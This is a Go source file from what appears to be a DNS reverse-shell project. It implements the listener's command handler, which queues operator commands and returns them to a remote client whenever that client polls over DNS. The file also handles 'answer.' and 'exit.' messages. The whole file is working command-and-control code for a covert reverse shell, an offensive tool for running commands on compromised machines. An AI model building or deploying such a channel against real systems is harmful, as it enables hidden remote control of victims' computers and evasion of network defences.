package listener

import (
	"dns-reverse-shell/main/shell"
	"fmt"
	"github.com/golang-collections/collections/queue"
)

type listenerCommandHandler struct {
	shell *shell.Shell
	queue *queue.Queue
}

func newListenerCommandHandler() *listenerCommandHandler {
	handler := listenerCommandHandler{queue: queue.New()}
	return &handler
}

func (c *listenerCommandHandler) init() {
	c.shell = shell.NewShell(c.queueCommand)
	c.shell.Start()
}

func (c *listenerCommandHandler) queueCommand(command string) {
	c.queue.Enqueue(command)
}

func (c *listenerCommandHandler) HandleCommand(value string, pollCallback func(), answerCallback func(string), exitCallback func()) {
	switch value {
	case "poll.":
		if c.queue.Len() == 0 {
			c.Poll(pollCallback)
		} else {
			c.Answer(c.queue.Dequeue().(string), answerCallback)
		}
	case "answer.":
		c.Answer("ok", answerCallback)
		c.shell.Resume()
		break
	case "exit.":
		c.Exit(exitCallback)
		break
	default:
		panic("Request value '" + value + "' unknown.")
	}
}

func (c *listenerCommandHandler) Poll(pollCallback func()) {
	pollCallback()
}

func (c *listenerCommandHandler) Answer(value string, answerCallback func(string)) {
	answerCallback(value)
}

func (c *listenerCommandHandler) Exit(exitCallback func()) {
	exitCallback()
	fmt.Println("Connection closed")
	c.shell.Start()
}

func (c *listenerCommandHandler) Default(defaultCallback func(string)) {
	defaultCallback(c.queue.Dequeue().(string))
}
